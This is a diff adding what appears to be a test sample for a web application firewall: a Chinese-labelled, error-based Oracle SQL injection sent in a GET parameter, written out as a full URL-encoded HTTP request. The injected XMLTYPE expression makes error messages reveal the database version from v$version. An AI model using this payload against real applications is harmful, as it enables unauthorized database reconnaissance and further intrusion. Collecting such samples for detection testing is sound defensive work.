@@ -1,0 +1,9 @@
+# SQL注入_GET_oracle_报错注入-06506312
+# 攻击者基于报错查询，将(select upper(xmltype(chr(60)||chr(58)||(select replace(banner,chr(32),chr(58)) from v$version where banner like 'O%')||chr(62))) from dual) is not null语句注入到 SQL 查询参数中，利用函数upper、xmltype获取数据库版本信息。
+GET /?id=1%20and%20%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7C%28select%20replace%28banner%2Cchr%2832%29%2Cchr%2858%29%29%20from%20v$version%20where%20banner%20like%20%27O%25%27%29%7C%7Cchr%2862%29%29%29%20from%20dual%29%20is%20not%20null&bid=hd_tag_m8mv240r HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv240r
+RM-PRO-Token: fb7d56e6d3004d1d15f4384d41c010e6
+RM-PRO-Time: 1742808356984
+User-Agent: curl/7.83.1
+
